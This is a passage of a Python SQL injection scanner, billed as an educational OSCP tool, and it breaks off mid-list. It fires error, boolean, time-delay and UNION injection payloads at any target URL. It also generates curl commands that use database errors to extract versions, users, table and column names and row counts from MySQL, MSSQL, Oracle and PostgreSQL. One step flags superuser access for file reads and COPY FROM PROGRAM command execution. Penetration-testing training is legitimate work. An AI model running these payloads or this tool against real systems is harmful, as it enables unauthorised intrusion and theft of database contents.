#!/usr/bin/env python3
"""
SQL Injection Scanner - Educational SQLi vulnerability detection tool
OSCP-focused tool for discovering and understanding SQL injection vulnerabilities
"""

import sys
import requests
import argparse
import time
import hashlib
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import json

try:
    from ..utils.colors import Colors
    from ..utils.curl_parser import CurlParser
except ImportError:
    # Fallback for standalone execution
    class Colors:
        HEADER = '\033[95m'
        BLUE = '\033[94m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'
        BOLD = '\033[1m'
        CYAN = '\033[96m'
        END = '\033[0m'

    # Try standalone import for curl_parser
    try:
        from crack.utils.curl_parser import CurlParser
    except ImportError:
        # Last resort - assume it's in same directory structure
        import sys
        from pathlib import Path
        utils_path = Path(__file__).parent.parent / 'utils'
        sys.path.insert(0, str(utils_path))
        from curl_parser import CurlParser

class SQLiScanner:
    def __init__(self, target, method='AUTO', data=None, params=None, technique='all',
                 verbose=False, quick=False, delay=0.5, timeout=10, min_findings=0):
        self.target = target.strip()
        self.method = method
        self.post_data = data
        self.test_params = params
        self.technique = technique
        self.verbose = verbose
        self.quick = quick
        self.delay = delay
        self.timeout = timeout
        self.min_findings = min_findings
        self.session = requests.Session()
        self.session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64) SQLi Scanner Educational Tool'
        self.baseline = None
        self.vulnerabilities = []
        self.tested_count = 0
        self.high_conf_found = 0

        # Parse URL and existing parameters
        self.parsed_url = urlparse(self.target)
        self.base_params = parse_qs(self.parsed_url.query)

        # Auto-detect method if needed
        if self.method == 'AUTO':
            self.method = 'POST' if self.post_data else 'GET'

        # Parse POST data if provided
        if self.post_data:
            self.post_params = parse_qs(self.post_data)
        else:
            self.post_params = {}

    def get_baseline(self):
        """Establish baseline response for comparison"""
        print(f"{Colors.BLUE}[*] Establishing baseline response...{Colors.END}")

        try:
            # Get multiple baseline samples for accuracy
            baselines = []
            for i in range(3):
                start = time.time()

                if self.method == 'GET':
                    resp = self.session.get(self.target, timeout=self.timeout)
                else:
                    # Use original POST data if provided
                    data = self.post_data if self.post_data else {}
                    resp = self.session.post(self.target, data=data, timeout=self.timeout)

                elapsed = time.time() - start

                baselines.append({
                    'status': resp.status_code,
                    'length': len(resp.content),
                    'time': elapsed,
                    'hash': hashlib.md5(resp.content).hexdigest(),
                    'lines': resp.text.count('\n'),
                    'words': len(resp.text.split())
                })

                if i < 2:  # Don't sleep after last baseline
                    time.sleep(0.5)

            # Use median values for stability
            self.baseline = {
                'status': sorted([b['status'] for b in baselines])[1],
                'length': sorted([b['length'] for b in baselines])[1],
                'time': sorted([b['time'] for b in baselines])[1],
                'hash': baselines[1]['hash'],
                'lines': sorted([b['lines'] for b in baselines])[1],
                'words': sorted([b['words'] for b in baselines])[1]
            }

            print(f"  Status: {self.baseline['status']} | Size: {self.baseline['length']} bytes")
            print(f"  Response time: {self.baseline['time']:.2f}s | Lines: {self.baseline['lines']}")

        except Exception as e:
            print(f"{Colors.RED}[!] Failed to establish baseline: {e}{Colors.END}")
            sys.exit(1)

    def test_error_based(self, param, original_value=''):
        """Test for error-based SQL injection"""
        if self.technique not in ['error', 'all']:
            return []

        findings = []

        # Error-inducing payloads for different databases
        payloads = [
            ("'", "Single quote - most common SQLi test"),
            ('"', "Double quote - tests different quote handling"),
            ("\\", "Backslash - tests escape character handling"),
            ("')", "Quote with closing parenthesis"),
            ("';", "Quote with semicolon - statement terminator"),
            ("'--", "Quote with comment - MySQL/PostgreSQL"),
            ("' /*", "Quote with comment - Oracle"),
            ("\\' OR '1'='1", "Escaped quote with boolean"),
            ("' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--", "MySQL specific syntax error")
        ]

        if self.quick:
            payloads = payloads[:3]  # Only test first 3 in quick mode

        # Database error patterns - specific DBs checked BEFORE generic patterns
        # This ensures proper database identification and avoids false positives
        error_patterns = {
            'mssql': [
                r'SqlException',
                r'System\.Data\.SqlClient',
                r'Unclosed quotation mark',
                r'Incorrect syntax near',
                r'Driver.*SQL[\s\-\_]*Server',
                r'OLE DB.*SQL Server',
                r'SQLServer JDBC Driver'
            ],
            'mysql': [
                r'SQL syntax.*MySQL',
                r'Warning.*mysql_',
                r'MySQLSyntaxErrorException',
                r'valid MySQL result',
                r'mysqli_',
                r'Unknown column',
                r'MySQL Error'
            ],
            'postgresql': [
                r'PostgreSQL.*ERROR',
                r'Warning.*pg_',
                r'valid PostgreSQL result',
                r'PSQLException',
                r'unterminated quoted string',
                r'syntax error at or near'
            ],
            'oracle': [
                r'Oracle.*Driver',
                r'Warning.*oci_',
                r'Warning.*ora_',
                r'Oracle error',
                r'ORA-[0-9]{5}',
                r'quoted string not properly terminated'
            ],
            'generic': [
                r'syntax error',
                r'database',
                r'unexpected end of SQL command',
                r'unterminated string literal'
            ]
        }

        for payload, description in payloads:
            self.tested_count += 1

            if self.verbose:
                print(f"    [ERROR-BASED] Testing: {param}={payload}")

            try:
                start = time.time()

                # Inject payload
                if self.method == 'GET':
                    # Build URL with injected parameter
                    test_params = self.base_params.copy()
                    test_params[param] = [original_value + payload]
                    query_string = urlencode(test_params, doseq=True)
                    test_url = urlunparse((
                        self.parsed_url.scheme,
                        self.parsed_url.netloc,
                        self.parsed_url.path,
                        '',
                        query_string,
                        ''
                    ))
                    resp = self.session.get(test_url, timeout=self.timeout)
                else:
                    # POST request
                    test_data = self.post_params.copy()
                    test_data[param] = [original_value + payload]
                    flat_data = {k: v[0] if isinstance(v, list) else v for k, v in test_data.items()}
                    resp = self.session.post(self.target, data=flat_data, timeout=self.timeout)

                elapsed = time.time() - start

                # Check for database errors
                found_errors = []
                db_type = None

                for db, patterns in error_patterns.items():
                    for pattern in patterns:
                        if re.search(pattern, resp.text, re.I):
                            found_errors.append(pattern)
                            if db != 'generic':
                                db_type = db
                            break

                if found_errors:
                    # Extract error message snippet with better heuristics
                    error_snippet = None
                    best_score = 0
                    has_stack_trace = False

                    for line in resp.text.split('\n'):
                        line_stripped = line.strip()

                        # Skip HTML tags, scripts, and empty lines
                        if not line_stripped or line_stripped.startswith('<') or 'src=' in line_stripped:
                            continue

                        # Count pattern matches in this line
                        match_count = sum(1 for p in found_errors if re.search(p, line, re.I))
                        if match_count == 0:
                            continue

                        # Score this line based on content quality
                        score = match_count * 10

                        # Boost for specific error indicators
                        if re.search(r'Exception|Error Number|syntax|quotation', line, re.I):
                            score += 20
                        if re.search(r'System\.|line \d+|at \w+\.\w+', line, re.I):
                            score += 15
                            has_stack_trace = True

                        # Take the best scoring line
                        if score > best_score:
                            best_score = score
                            error_snippet = line_stripped[:200]

                    # Calculate confidence based on error quality
                    base_confidence = 60 + len(found_errors) * 10

                    # Boost confidence for high-quality error messages
                    if has_stack_trace:
                        base_confidence += 20
                    if db_type and db_type != 'generic':
                        base_confidence += 10
                    if re.search(r'SqlException|MySQLSyntaxError|PSQLException|ORA-\d+', resp.text):
                        base_confidence += 15

                    confidence = min(95, base_confidence)

                    findings.append({
                        'type': 'error',
                        'payload': payload,
                        'description': description,
                        'confidence': confidence,
                        'db_type': db_type or 'unknown',
                        'errors': found_errors,
                        'snippet': error_snippet,
                        'response_time': elapsed
                    })

                    if self.verbose and error_snippet:
                        print(f"{Colors.GREEN}      ✓ Error detected: {error_snippet[:80]}...{Colors.END}")

            except requests.RequestException as e:
                if self.verbose:
                    print(f"{Colors.YELLOW}      ! Request failed: {e}{Colors.END}")

            time.sleep(self.delay)

        return findings

    def test_boolean_based(self, param, original_value=''):
        """Test for boolean-based blind SQL injection"""
        if self.technique not in ['boolean', 'all']:
            return []

        findings = []

        # Boolean test pairs (true condition, false condition, description)
        test_pairs = [
            ("' AND '1'='1", "' AND '1'='2", "String-based boolean logic"),
            ("' OR '1'='1", "' OR '1'='2", "OR-based boolean test"),
            (" AND 1=1", " AND 1=2", "Numeric boolean logic"),
            (" OR 1=1", " OR 1=2", "Numeric OR test"),
            ("' AND '1' LIKE '1", "' AND '1' LIKE '2", "LIKE operator test"),
            ("' AND 1=1--", "' AND 1=2--", "With comment terminator"),
            ("' AND 'a'='a", "' AND 'a'='b", "Character comparison"),
            ("')) AND (('1'='1", "')) AND (('1'='2", "Double parenthesis test")
        ]

        if self.quick:
            test_pairs = test_pairs[:3]

        for true_payload, false_payload, description in test_pairs:
            self.tested_count += 2  # Testing two payloads

            if self.verbose:
                print(f"    [BOOLEAN-BASED] Testing: {description}")

            try:
                # Test TRUE condition
                if self.method == 'GET':
                    test_params = self.base_params.copy()
                    test_params[param] = [original_value + true_payload]
                    query_string = urlencode(test_params, doseq=True)
                    test_url = urlunparse((
                        self.parsed_url.scheme,
                        self.parsed_url.netloc,
                        self.parsed_url.path,
                        '',
                        query_string,
                        ''
                    ))
                    true_resp = self.session.get(test_url, timeout=self.timeout)
                else:
                    test_data = self.post_params.copy()
                    test_data[param] = [original_value + true_payload]
                    flat_data = {k: v[0] if isinstance(v, list) else v for k, v in test_data.items()}
                    true_resp = self.session.post(self.target, data=flat_data, timeout=self.timeout)

                time.sleep(self.delay)

                # Test FALSE condition
                if self.method == 'GET':
                    test_params[param] = [original_value + false_payload]
                    query_string = urlencode(test_params, doseq=True)
                    test_url = urlunparse((
                        self.parsed_url.scheme,
                        self.parsed_url.netloc,
                        self.parsed_url.path,
                        '',
                        query_string,
                        ''
                    ))
                    false_resp = self.session.get(test_url, timeout=self.timeout)
                else:
                    test_data[param] = [original_value + false_payload]
                    flat_data = {k: v[0] if isinstance(v, list) else v for k, v in test_data.items()}
                    false_resp = self.session.post(self.target, data=flat_data, timeout=self.timeout)

                # Analyze differences
                true_len = len(true_resp.content)
                false_len = len(false_resp.content)
                size_diff = abs(true_len - false_len)

                true_lines = true_resp.text.count('\n')
                false_lines = false_resp.text.count('\n')
                line_diff = abs(true_lines - false_lines)

                true_words = len(true_resp.text.split())
                false_words = len(false_resp.text.split())
                word_diff = abs(true_words - false_words)

                # Check if responses are different enough
                significant_diff = (
                    size_diff > 50 or
                    line_diff > 3 or
                    word_diff > 10 or
                    true_resp.status_code != false_resp.status_code
                )

                # Also check if true condition matches baseline better than false
                true_baseline_diff = abs(true_len - self.baseline['length'])
                false_baseline_diff = abs(false_len - self.baseline['length'])

                if significant_diff:
                    confidence = 0
                    reasons = []

                    if size_diff > 100:
                        confidence += 40
                        reasons.append(f"size diff: {size_diff} bytes")
                    elif size_diff > 50:
                        confidence += 25
                        reasons.append(f"size diff: {size_diff} bytes")

                    if line_diff > 5:
                        confidence += 30
                        reasons.append(f"line diff: {line_diff}")
                    elif line_diff > 3:
                        confidence += 20
                        reasons.append(f"line diff: {line_diff}")

                    if word_diff > 20:
                        confidence += 30
                        reasons.append(f"word diff: {word_diff}")
                    elif word_diff > 10:
                        confidence += 20
                        reasons.append(f"word diff: {word_diff}")

                    if true_resp.status_code != false_resp.status_code:
                        confidence += 40
                        reasons.append(f"status diff: {true_resp.status_code} vs {false_resp.status_code}")

                    # Bonus confidence if true matches baseline better
                    if true_baseline_diff < false_baseline_diff:
                        confidence += 10
                        reasons.append("true condition matches baseline")

                    confidence = min(confidence, 90)

                    if confidence >= 40:  # Only record significant findings
                        findings.append({
                            'type': 'boolean',
                            'true_payload': true_payload,
                            'false_payload': false_payload,
                            'description': description,
                            'confidence': confidence,
                            'true_size': true_len,
                            'false_size': false_len,
                            'size_diff': size_diff,
                            'reasons': reasons
                        })

                        if self.verbose:
                            print(f"{Colors.GREEN}      ✓ Boolean difference detected: {', '.join(reasons)}{Colors.END}")

            except requests.RequestException as e:
                if self.verbose:
                    print(f"{Colors.YELLOW}      ! Request failed: {e}{Colors.END}")

            time.sleep(self.delay)

        return findings

    def test_time_based(self, param, original_value=''):
        """Test for time-based blind SQL injection"""
        if self.technique not in ['time', 'all']:
            return []

        findings = []

        # Time-based payloads for different databases
        sleep_time = 5 if not self.quick else 3

        payloads = [
            (f"' AND SLEEP({sleep_time})--", "MySQL", f"SLEEP({sleep_time})"),
            (f"'; WAITFOR DELAY '00:00:0{sleep_time}'--", "MSSQL", f"WAITFOR DELAY"),
            (f"' AND pg_sleep({sleep_time})--", "PostgreSQL", f"pg_sleep({sleep_time})"),
            (f"' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{sleep_time})--", "Oracle", "DBMS_PIPE"),
            (f"' AND (SELECT {sleep_time} FROM DUAL WHERE 1=1)--", "Oracle", "SELECT FROM DUAL"),
            (f" AND SLEEP({sleep_time})", "MySQL (numeric)", f"SLEEP({sleep_time})"),
            (f"' OR SLEEP({sleep_time})--", "MySQL (OR)", f"SLEEP({sleep_time})"),
            (f"')) AND SLEEP({sleep_time})--", "MySQL (nested)", f"SLEEP({sleep_time})")
        ]

        if self.quick:
            payloads = payloads[:3]

        for payload, db_type, technique_name in payloads:
            self.tested_count += 1

            if self.verbose:
                print(f"    [TIME-BASED] Testing: {db_type} - {technique_name}")

            try:
                # First, get a baseline timing without sleep
                start = time.time()
                if self.method == 'GET':
                    test_params = self.base_params.copy()
                    test_params[param] = [original_value]
                    query_string = urlencode(test_params, doseq=True)
                    test_url = urlunparse((
                        self.parsed_url.scheme,
                        self.parsed_url.netloc,
                        self.parsed_url.path,
                        '',
                        query_string,
                        ''
                    ))
                    self.session.get(test_url, timeout=self.timeout + sleep_time + 2)
                else:
                    test_data = self.post_params.copy()
                    test_data[param] = [original_value]
                    flat_data = {k: v[0] if isinstance(v, list) else v for k, v in test_data.items()}
                    self.session.post(self.target, data=flat_data, timeout=self.timeout + sleep_time + 2)
                baseline_time = time.time() - start

                time.sleep(0.5)

                # Now test with sleep payload
                start = time.time()
                if self.method == 'GET':
                    test_params[param] = [original_value + payload]
                    query_string = urlencode(test_params, doseq=True)
                    test_url = urlunparse((
                        self.parsed_url.scheme,
                        self.parsed_url.netloc,
                        self.parsed_url.path,
                        '',
                        query_string,
                        ''
                    ))
                    resp = self.session.get(test_url, timeout=self.timeout + sleep_time + 2)
                else:
                    test_data[param] = [original_value + payload]
                    flat_data = {k: v[0] if isinstance(v, list) else v for k, v in test_data.items()}
                    resp = self.session.post(self.target, data=flat_data, timeout=self.timeout + sleep_time + 2)
                elapsed = time.time() - start

                # Check if response was delayed
                delay_diff = elapsed - baseline_time

                if delay_diff >= (sleep_time - 1):  # Allow 1 second tolerance
                    confidence = min(90, 50 + (delay_diff / sleep_time) * 40)

                    findings.append({
                        'type': 'time',
                        'payload': payload,
                        'db_type': db_type,
                        'technique': technique_name,
                        'confidence': confidence,
                        'baseline_time': baseline_time,
                        'payload_time': elapsed,
                        'delay': delay_diff,
                        'expected_delay': sleep_time
                    })

                    if self.verbose:
                        print(f"{Colors.GREEN}      ✓ Time delay detected: {delay_diff:.1f}s (expected: {sleep_time}s){Colors.END}")

            except requests.Timeout:
                # Timeout might indicate successful sleep injection
                if self.verbose:
                    print(f"{Colors.YELLOW}      ? Request timeout - possible time-based SQLi{Colors.END}")
            except requests.RequestException as e:
                if self.verbose:
                    print(f"{Colors.YELLOW}      ! Request failed: {e}{Colors.END}")

            time.sleep(self.delay)

        return findings

    def test_union_based(self, param, original_value=''):
        """Test for UNION-based SQL injection"""
        if self.technique not in ['union', 'all']:
            return []

        findings = []
        max_columns = 10 if not self.quick else 5

        if self.verbose:
            print(f"    [UNION-BASED] Testing ORDER BY for column count...")

        # First, find the number of columns using ORDER BY
        column_count = 0
        for i in range(1, max_columns + 1):
            self.tested_count += 1

            payload = f"' ORDER BY {i}--"

            try:
                if self.method == 'GET':
                    test_params = self.base_params.copy()
                    test_params[param] = [original_value + payload]
                    query_string = urlencode(test_params, doseq=True)
                    test_url = urlunparse((
                        self.parsed_url.scheme,
                        self.parsed_url.netloc,
                        self.parsed_url.path,
                        '',
                        query_string,
                        ''
                    ))
                    resp = self.session.get(test_url, timeout=self.timeout)
                else:
                    test_data = self.post_params.copy()
                    test_data[param] = [original_value + payload]
                    flat_data = {k: v[0] if isinstance(v, list) else v for k, v in test_data.items()}
                    resp = self.session.post(self.target, data=flat_data, timeout=self.timeout)

                # Check for errors indicating column count exceeded
                error_indicators = [
                    'Unknown column',
                    'ORDER BY position',
                    'ORDER BY clause',
                    'out of range',
                    'Column count',
                    'does not exist'
                ]

                has_error = any(ind in resp.text for ind in error_indicators)
                status_changed = resp.status_code != self.baseline['status']
                size_changed = abs(len(resp.content) - self.baseline['length']) > 100

                if has_error or (status_changed and resp.status_code >= 400):
                    column_count = i - 1
                    if self.verbose:
                        print(f"{Colors.GREEN}      ✓ Column count found: {column_count}{Colors.END}")
                    break

            except requests.RequestException:
                pass

            time.sleep(self.delay)

        # If we found columns, test UNION SELECT
        if column_count > 0:
            # Build UNION payload with correct number of columns
            union_values = ['NULL'] * column_count

            # Test different UNION variations
            union_tests = [
                ("' UNION SELECT " + ",".join(union_values) + "--", "NULL values"),
                ("' UNION ALL SELECT " + ",".join(union_values) + "--", "UNION ALL"),
                ("') UNION SELECT " + ",".join(union_values) + "--", "With closing parenthesis"),
                ("' UNION SELECT " + ",".join(['1'] * column_count) + "--", "Numeric values"),
                ("' UNION SELECT " + ",".join([f"'{i}'" for i in range(column_count)]) + "--", "String values")
            ]

            for union_payload, description in union_tests:
                self.tested_count += 1

                if self.verbose:
                    print(f"    [UNION-BASED] Testing: {description}")

                try:
                    if self.method == 'GET':
                        test_params = self.base_params.copy()
                        test_params[param] = [original_value + union_payload]
                        query_string = urlencode(test_params, doseq=True)
                        test_url = urlunparse((
                            self.parsed_url.scheme,
                            self.parsed_url.netloc,
                            self.parsed_url.path,
                            '',
                            query_string,
                            ''
                        ))
                        resp = self.session.get(test_url, timeout=self.timeout)
                    else:
                        test_data = self.post_params.copy()
                        test_data[param] = [original_value + union_payload]
                        flat_data = {k: v[0] if isinstance(v, list) else v for k, v in test_data.items()}
                        resp = self.session.post(self.target, data=flat_data, timeout=self.timeout)

                    # Check if UNION worked
                    content_changed = hashlib.md5(resp.content).hexdigest() != self.baseline['hash']
                    no_errors = not any(err in resp.text.lower() for err in ['error', 'warning', 'fatal'])

                    if content_changed and no_errors:
                        confidence = 85

                        findings.append({
                            'type': 'union',
                            'payload': union_payload,
                            'description': description,
                            'confidence': confidence,
                            'column_count': column_count,
                            'response_size': len(resp.content)
                        })

                        if self.verbose:
                            print(f"{Colors.GREEN}      ✓ UNION SELECT successful with {column_count} columns{Colors.END}")

                        break  # One successful UNION is enough

                except requests.RequestException:
                    pass

                time.sleep(self.delay)

        return findings

    def _get_mysql_error_steps(self, param):
        """MySQL error-based enumeration steps"""

        steps = [
            {
                'title': 'Extract Database Version',
                'payload': "1' AND extractvalue(1,concat(0x7e,version()))--",
                'grep_pattern': '| grep -i "xpath" -A2',
                'purpose': 'Use EXTRACTVALUE() to trigger MySQL error revealing version',
                'what_to_look_for': 'MySQL version number after "~" in XPATH syntax error'
            },
            {
                'title': 'Extract Current Database Name',
                'payload': "1' AND extractvalue(1,concat(0x7e,database()))--",
                'grep_pattern': '| grep -i "xpath" -A2',
                'purpose': 'Get current database name for table enumeration',
                'what_to_look_for': 'Database name after "~" in error message'
            },
            {
                'title': 'Extract Current User',
                'payload': "1' AND extractvalue(1,concat(0x7e,user()))--",
                'grep_pattern': '| grep -i "xpath" -A2',
                'purpose': 'Check privilege level (root@localhost is highest)',
                'what_to_look_for': 'Username@host after "~" in error'
            },
            {
                'title': 'Enumerate Table Names',
                'payload': "1' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 0)))--",
                'grep_pattern': '| grep -i "xpath" -A2',
                'purpose': 'Extract table names one by one from current database',
                'what_to_look_for': 'Table name after "~" in error',
                'iterate_note': 'Change OFFSET 0 to 1, 2, 3... to enumerate all tables'
            },
            {
                'title': 'Extract Column Names',
                'payload': "1' AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='TABLENAME' LIMIT 1 OFFSET 0)))--",
                'grep_pattern': '| grep -i "xpath" -A2',
                'purpose': 'Extract columns from discovered tables',
                'what_to_look_for': 'Column name after "~" in error',
                'requires_input': 'TABLENAME',
                'iterate_note': 'Change OFFSET to enumerate all columns'
            }
        ]

        # Build curl commands
        formatted_steps = []
        for step in steps:
            if self.method == 'POST':
                data_copy = self.post_params.copy()
                data_copy[param] = [step['payload']]
                data_str = '&'.join([f"{k}={v[0] if isinstance(v, list) else v}"
                                    for k, v in data_copy.items()])

                curl_cmd = f"curl -X POST {self.target} \\\n  -d \"{data_str}\" \\\n  {step['grep_pattern']}"
            else:
                # GET request
                curl_cmd = f"curl \"{self.target}?{param}={step['payload']}\" \\\n  {step['grep_pattern']}"

            formatted_steps.append({
                'title': step['title'],
                'curl': curl_cmd,
                'purpose': step['purpose'],
                'what_to_look_for': step['what_to_look_for'],
                'critical_note': step.get('critical_note'),
                'efficiency_note': step.get('efficiency_note'),
                'iterate_note': step.get('iterate_note'),
                'requires_input': step.get('requires_input'),
                'example': step.get('example')
            })

        return formatted_steps

    def _get_mssql_error_steps(self, param):
        """MSSQL error-based enumeration steps"""

        steps = [
            {
                'title': 'Extract Database Version',
                'payload': "1' AND 1=CONVERT(int,@@version)--",
                'grep_pattern': '| grep -i "conversion\\|convert" -A2',
                'purpose': 'Use CONVERT() type mismatch to reveal MSSQL version',
                'what_to_look_for': 'Microsoft SQL Server version in conversion error'
            },
            {
                'title': 'Extract Current Database Name',
                'payload': "1' AND 1=CONVERT(int,DB_NAME())--",
                'grep_pattern': '| grep -i "conversion\\|convert" -A2',
                'purpose': 'Get current database name for enumeration',
                'what_to_look_for': 'Database name in conversion error'
            },
            {
                'title': 'Extract Current User',
                'payload': "1' AND 1=CONVERT(int,SYSTEM_USER)--",
                'grep_pattern': '| grep -i "conversion\\|convert" -A2',
                'purpose': 'Check privilege level (sa is sysadmin)',
                'what_to_look_for': 'Username in error (sa = full control)'
            },
            {
                'title': 'Enumerate Table Names',
                'payload': "1' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name NOT IN (SELECT TOP 0 name FROM sysobjects WHERE xtype='U')))--",
                'grep_pattern': '| grep -i "conversion\\|convert" -A2',
                'purpose': 'Extract table names using TOP clause (MSSQL-specific)',
                'what_to_look_for': 'Table name in error',
                'iterate_note': 'Change TOP 0 to TOP 1, TOP 2, etc. to enumerate all tables'
            },
            {
                'title': 'Extract Column Names',
                'payload': "1' AND 1=CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='TABLENAME'))--",
                'grep_pattern': '| grep -i "conversion\\|convert" -A2',
                'purpose': 'Extract columns from discovered tables',
                'what_to_look_for': 'Column name in conversion error',
                'requires_input': 'TABLENAME',
                'iterate_note': 'Use TOP 1/TOP 2/etc. to enumerate all columns'
            }
        ]

        # Build curl commands
        formatted_steps = []
        for step in steps:
            if self.method == 'POST':
                data_copy = self.post_params.copy()
                data_copy[param] = [step['payload']]
                data_str = '&'.join([f"{k}={v[0] if isinstance(v, list) else v}"
                                    for k, v in data_copy.items()])

                curl_cmd = f"curl -X POST {self.target} \\\n  -d \"{data_str}\" \\\n  {step['grep_pattern']}"
            else:
                # GET request
                curl_cmd = f"curl \"{self.target}?{param}={step['payload']}\" \\\n  {step['grep_pattern']}"

            formatted_steps.append({
                'title': step['title'],
                'curl': curl_cmd,
                'purpose': step['purpose'],
                'what_to_look_for': step['what_to_look_for'],
                'critical_note': step.get('critical_note'),
                'efficiency_note': step.get('efficiency_note'),
                'iterate_note': step.get('iterate_note'),
                'requires_input': step.get('requires_input'),
                'example': step.get('example')
            })

        return formatted_steps

    def _get_oracle_error_steps(self, param):
        """Oracle error-based enumeration steps"""

        steps = [
            {
                'title': 'Extract Database Version',
                'payload': "1' AND 1=CAST((SELECT banner FROM v$version WHERE ROWNUM=1) AS NUMBER)--",
                'grep_pattern': '| grep -i "invalid number" -A2',
                'purpose': 'Use NUMBER conversion error to reveal Oracle version',
                'what_to_look_for': 'Oracle version in "invalid number" error'
            },
            {
                'title': 'Extract Current Database/Schema',
                'payload': "1' AND 1=CAST((SELECT SYS_CONTEXT('USERENV','CURRENT_SCHEMA') FROM dual) AS NUMBER)--",
                'grep_pattern': '| grep -i "invalid number" -A2',
                'purpose': 'Get current schema name',
                'what_to_look_for': 'Schema name in error message'
            },
            {
                'title': 'Extract Current User',
                'payload': "1' AND 1=CAST((SELECT USER FROM dual) AS NUMBER)--",
                'grep_pattern': '| grep -i "invalid number" -A2',
                'purpose': 'Check privilege level (SYS/SYSTEM are DBA)',
                'what_to_look_for': 'Username in error'
            },
            {
                'title': 'Enumerate Table Names',
                'payload': "1' AND 1=CAST((SELECT table_name FROM all_tables WHERE ROWNUM=1 AND table_name NOT IN ('TABLE1')) AS NUMBER)--",
                'grep_pattern': '| grep -i "invalid number" -A2',
                'purpose': 'Extract table names using ROWNUM (Oracle-specific)',
                'what_to_look_for': 'Table name in error',
                'iterate_note': "Add discovered tables to NOT IN clause: ('TABLE1','TABLE2',...)"
            },
            {
                'title': 'Extract Column Names',
                'payload': "1' AND 1=CAST((SELECT column_name FROM all_tab_columns WHERE table_name='TABLENAME' AND ROWNUM=1) AS NUMBER)--",
                'grep_pattern': '| grep -i "invalid number" -A2',
                'purpose': 'Extract columns from discovered tables',
                'what_to_look_for': 'Column name in error',
                'requires_input': 'TABLENAME',
                'iterate_note': 'Add discovered columns to NOT IN clause'
            }
        ]

        # Build curl commands
        formatted_steps = []
        for step in steps:
            if self.method == 'POST':
                data_copy = self.post_params.copy()
                data_copy[param] = [step['payload']]
                data_str = '&'.join([f"{k}={v[0] if isinstance(v, list) else v}"
                                    for k, v in data_copy.items()])

                curl_cmd = f"curl -X POST {self.target} \\\n  -d \"{data_str}\" \\\n  {step['grep_pattern']}"
            else:
                # GET request
                curl_cmd = f"curl \"{self.target}?{param}={step['payload']}\" \\\n  {step['grep_pattern']}"

            formatted_steps.append({
                'title': step['title'],
                'curl': curl_cmd,
                'purpose': step['purpose'],
                'what_to_look_for': step['what_to_look_for'],
                'critical_note': step.get('critical_note'),
                'efficiency_note': step.get('efficiency_note'),
                'iterate_note': step.get('iterate_note'),
                'requires_input': step.get('requires_input'),
                'example': step.get('example')
            })

        return formatted_steps

    def _get_boolean_steps(self, param, db_type):
        """Boolean-based blind SQLi recommendations (placeholder)"""
        # For future expansion - boolean-based is slower, use error-based when possible
        return []

    def _get_time_steps(self, param, db_type):
        """Time-based blind SQLi recommendations (placeholder)"""
        # For future expansion - time-based is slowest, use error/boolean when possible
        return []

    def _get_union_steps(self, param, col_count):
        """UNION-based SQLi recommendations (placeholder)"""
        # For future expansion - UNION-based already shown in main exploitation guide
        return []

    def _get_postgresql_error_steps(self, param):
        """PostgreSQL error-based enumeration steps"""

        steps = [
            {
                'title': 'Extract Database Version',
                'payload': "1' AND 1=CAST((SELECT version()) AS int)--",
                'grep_pattern': '| grep -i "invalid\\|error\\|warning" -A3',
                'purpose': 'PostgreSQL version detection for CVE matching',
                'what_to_look_for': 'PostgreSQL version number in error message (e.g., "PostgreSQL 13.2 on x86_64-pc-linux-gnu")'
            },
            {
                'title': 'Extract Current Database Name',
                'payload': "1' AND 1=CAST((SELECT current_database()) AS int)--",
                'grep_pattern': '| grep -i "invalid\\|error\\|warning" -A3',
                'purpose': 'Get current database name for targeted enumeration',
                'what_to_look_for': 'Database name in "invalid input syntax" error'
            },
            {
                'title': 'Extract Current User',
                'payload': "1' AND 1=CAST((SELECT current_user) AS int)--",
                'grep_pattern': '| grep -i "invalid\\|error\\|warning" -A3',
                'purpose': 'Identify database user for privilege assessment',
                'what_to_look_for': 'Username in error (e.g., "postgres", "webapp_user")'
            },
            {
                'title': 'Check Superuser Privileges ⚠️ CRITICAL',
                'payload': "1' AND 1=CAST((SELECT CASE WHEN usesuper THEN 'superuser' ELSE 'not_superuser' END FROM pg_user WHERE usename=current_user) AS int)--",
                'grep_pattern': '| grep -i "invalid\\|error\\|warning" -A3',
                'purpose': 'Determine if current user has superuser privileges (REQUIRED for RCE)',
                'what_to_look_for': '"superuser" = Can use pg_read_file() and COPY FROM PROGRAM for RCE. "not_superuser" = Limited to data extraction',
                'critical_note': 'If superuser: pg_read_file(\'/etc/passwd\') and COPY FROM PROGRAM \'whoami\' available'
            },
            {
                'title': 'Enumerate All Databases',
                'payload': "1' AND 1=CAST((SELECT string_agg(datname,',') FROM pg_database) AS int)--",
                'grep_pattern': '| grep -i "invalid\\|error\\|warning" -A3',
                'purpose': 'List all databases on the PostgreSQL server',
                'what_to_look_for': 'Comma-separated database names (explore each for sensitive data)',
                'efficiency_note': 'Gets ALL databases in ONE query'
            },
            {
                'title': 'Enumerate All Tables (Public Schema)',
                'payload': "1' AND 1=CAST((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public') AS int)--",
                'grep_pattern': '| grep -i "invalid\\|error\\|warning" -A3',
                'purpose': 'Get all user tables in public schema (excludes system tables)',
                'what_to_look_for': 'Comma-separated table names (e.g., "users,posts,sessions")',
                'efficiency_note': 'Gets ALL tables in ONE query, filters out pg_catalog noise'
            },
            {
                'title': 'Enumerate All Columns for Table',
                'payload': "1' AND 1=CAST((SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='TABLENAME') AS int)--",
                'grep_pattern': '| grep -i "invalid\\|error\\|warning" -A3',
                'purpose': 'Get all columns for a specific table in one query',
                'what_to_look_for': 'Comma-separated column names (e.g., "id,username,password,email")',
                'requires_input': 'TABLENAME',
                'efficiency_note': 'Gets ALL columns in ONE query instead of iterating'
            },
            {
                'title': 'Count Records in Table',
                'payload': "1' AND 1=CAST((SELECT 'Count: ' || COUNT(*)::text FROM TABLENAME) AS int)--",
                'grep_pattern': '| grep -i "invalid\\|error\\|warning" -A3',
